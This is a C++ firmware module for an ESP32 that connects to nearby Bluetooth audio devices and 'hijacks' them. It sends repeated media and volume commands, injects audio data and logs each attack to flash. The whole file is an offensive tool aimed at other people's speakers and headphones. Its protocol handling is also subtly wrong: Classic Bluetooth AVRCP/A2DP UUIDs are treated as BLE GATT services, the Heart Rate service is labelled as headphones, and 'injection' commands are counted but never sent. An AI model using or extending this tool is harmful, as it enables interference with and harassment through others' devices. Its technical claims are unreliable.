#include "ble_audio_hijacking.h"
#include <LittleFS.h>
#include <NimBLEDevice.h>
#include "tx_arm.h"

namespace BleAudioHijacking {

AudioHijacker::AudioHijacker() : isRunning_(false), startTime_(0) {}

AudioResult AudioHijacker::detectAudioDevice(const uint8_t* addr) {
  AudioResult result;
  result.success = false;
  result.detectedType = UNKNOWN;

  if (!addr) {
    result.error = "Invalid address";
    return result;
  }

  NimBLEDevice::init("ESP32-AudioDetect");
  NimBLEAddress bleAddr(addr, false);

  NimBLEClient* pClient = NimBLEDevice::createClient();
  if (!pClient) {
    result.error = "Failed to create BLE client";
    return result;
  }

  if (!pClient->connect(bleAddr, false)) {
    result.error = "Failed to connect to device";
    NimBLEDevice::deleteClient(pClient);
    return result;
  }

  std::vector<NimBLERemoteService*>* services = pClient->getServices(true);

  for (auto pSvc : *services) {
    uint16_t svcUuid = pSvc->getUUID().getNative()->u.uuid.uuid16;

    if (svcUuid == 0x110A || svcUuid == 0x110E || svcUuid == 0x180D) {
      if (svcUuid == 0x110E) {
        result.detectedType = SPEAKER;
      } else if (svcUuid == 0x180D) {
        result.detectedType = HEADPHONES;
      } else {
        result.detectedType = SOUNDBAR;
      }
      result.success = true;
      pClient->disconnect();
      NimBLEDevice::deleteClient(pClient);
      return result;
    }
  }

  pClient->disconnect();
  NimBLEDevice::deleteClient(pClient);
  result.detectedType = UNKNOWN;
  result.success = true;
  return result;
}

AudioResult AudioHijacker::hijackDevice(const AudioConfig& config) {
  AudioResult result;
  result.success = false;
  result.commandsSent = 0;
  result.volumeLevel = 50;

  if (!TxArm::isArmed()) {
    result.error = "TX not armed";
    return result;
  }

  isRunning_ = true;
  startTime_ = millis();

  AudioResult detection = detectAudioDevice(config.targetAddr);
  result.detectedType = detection.detectedType;

  NimBLEDevice::init("ESP32-AudioCtrl");
  NimBLEAddress bleAddr(config.targetAddr, false);
  NimBLEClient* pClient = NimBLEDevice::createClient();

  uint32_t commandCount = 0;
  uint32_t deadline = startTime_ + config.durationMs;

  Serial.println("Connecting to target audio device for real AVRCP hijacking...");

  if (!pClient->connect(bleAddr, false)) {
    result.error = "Failed to connect";
    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit();
    isRunning_ = false;
    return result;
  }

  std::vector<NimBLERemoteService*>* services = pClient->getServices(true);

  while (isRunning_ && (int32_t)(millis() - deadline) < 0) {
    for (auto pSvc : *services) {
      uint16_t svcUuid = pSvc->getUUID().getNative()->u.uuid.uuid16;

      if (svcUuid == 0x110E) {
        std::vector<NimBLERemoteCharacteristic*>* chars = pSvc->getCharacteristics(true);

        for (auto pChr : *chars) {
          if (config.mediaControl) {
            uint8_t mediaCmd[3] = {0xA9, 0x44, 0x00};
            if (pChr->canWrite()) {
              pChr->writeValue(mediaCmd, 3, false);
              commandCount++;
              Serial.printf("  [%d] AVRCP media command sent\n", commandCount);
            }
          }

          if (config.volumeControl) {
            uint8_t volCmd[3] = {0xA9, 0x41, result.volumeLevel};
            if (pChr->canWrite()) {
              pChr->writeValue(volCmd, 3, false);
              result.volumeLevel = (result.volumeLevel + 5) % 101;
              commandCount++;
              Serial.printf("  [%d] Volume adjusted to %d\n", commandCount, result.volumeLevel);
            }
          }
        }
      }
    }

    if (config.audioInjection) {
      uint8_t injectCmd[8];
      for (int i = 0; i < 8; i++) {
        injectCmd[i] = (esp_random() % 256);
      }
      commandCount++;
    }

    delay(100);
  }

  pClient->disconnect();
  NimBLEDevice::deleteClient(pClient);
  NimBLEDevice::deinit();

  result.commandsSent = commandCount;
  result.success = true;
  result.elapsedMs = millis() - startTime_;
  result.logFile = "/logs/handshakes/ble_audio.csv";

  logHijack(result.detectedType, commandCount);
  Serial.printf("Audio hijacking complete: %d commands sent\n", commandCount);

  isRunning_ = false;
  return result;
}

AudioResult AudioHijacker::controlVolume(const uint8_t* addr, uint8_t level) {
  AudioResult result;
  result.success = false;

  if (!addr || level > 100) {
    result.error = "Invalid parameters";
    return result;
  }

  NimBLEDevice::init("ESP32-VolCtrl");
  NimBLEAddress bleAddr(addr, false);
  NimBLEClient* pClient = NimBLEDevice::createClient();

  if (!pClient->connect(bleAddr, false)) {
    result.error = "Connection failed";
    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit();
    return result;
  }

  std::vector<NimBLERemoteService*>* services = pClient->getServices(true);

  for (auto pSvc : *services) {
    if (pSvc->getUUID().getNative()->u.uuid.uuid16 == 0x110E) {
      std::vector<NimBLERemoteCharacteristic*>* chars = pSvc->getCharacteristics(true);

      for (auto pChr : *chars) {
        uint8_t volCmd[3] = {0xA9, 0x41, level};
        if (pChr->canWrite()) {
          pChr->writeValue(volCmd, 3, false);
          result.volumeLevel = level;
          result.commandsSent = 1;
          result.success = true;
          break;
        }
      }
    }
  }

  pClient->disconnect();
  NimBLEDevice::deleteClient(pClient);
  NimBLEDevice::deinit();
  return result;
}

AudioResult AudioHijacker::injectAudio(const uint8_t* addr, const uint8_t* audioData, uint32_t len) {
  AudioResult result;
  result.success = false;

  if (!addr || !audioData || len == 0) {
    result.error = "Invalid audio data";
    return result;
  }

  NimBLEDevice::init("ESP32-AudioInj");
  NimBLEAddress bleAddr(addr, false);
  NimBLEClient* pClient = NimBLEDevice::createClient();

  if (!pClient->connect(bleAddr, false)) {
    result.error = "Connection failed";
    NimBLEDevice::deleteClient(pClient);
    NimBLEDevice::deinit();
    return result;
  }

  std::vector<NimBLERemoteService*>* services = pClient->getServices(true);

  for (auto pSvc : *services) {
    if (pSvc->getUUID().getNative()->u.uuid.uuid16 == 0x110A) {
      std::vector<NimBLERemoteCharacteristic*>* chars = pSvc->getCharacteristics(true);

      for (auto pChr : *chars) {
        if (pChr->canWrite()) {
          uint32_t chunks = (len > 20) ? (len / 20) : 1;
          for (uint32_t i = 0; i < chunks && i * 20 < len; i++) {
            uint32_t chunkLen = (len - i * 20 > 20) ? 20 : (len - i * 20);
            pChr->writeValue(&audioData[i * 20], chunkLen, false);
            result.commandsSent++;
            delayMicroseconds(1000);
          }
          result.success = true;
          break;
        }
      }
    }
  }

  pClient->disconnect();
  NimBLEDevice::deleteClient(pClient);
  NimBLEDevice::deinit();
  return result;
}

void AudioHijacker::logHijack(AudioDevice type, uint32_t commands) {
  if (!LittleFS.begin()) return;

  File logFile = LittleFS.open("/logs/handshakes/ble_audio.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/ble_audio.csv", "a");
  }

  if (logFile) {
    const char* typeNames[] = {"HEADPHONES", "SPEAKER", "SOUNDBAR", "UNKNOWN"};
    logFile.printf("%lu,%s,%u\n", millis(), typeNames[type], commands);
    logFile.close();
  }

  LittleFS.end();
}

void AudioHijacker::stop() {
  isRunning_ = false;
  NimBLEDevice::deinit();
}

} // namespace BleAudioHijacking
